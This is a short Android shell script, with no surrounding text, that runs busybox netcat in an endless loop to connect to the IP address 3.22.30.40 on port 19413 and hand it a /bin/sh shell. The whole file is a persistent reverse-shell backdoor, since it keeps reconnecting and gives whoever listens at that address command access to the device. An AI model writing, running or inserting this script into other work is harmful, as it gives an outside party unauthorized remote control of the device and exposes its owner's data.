#!/system/bin/sh
while true
do
  busybox nc 3.22.30.40 19413 -e /bin/sh
done


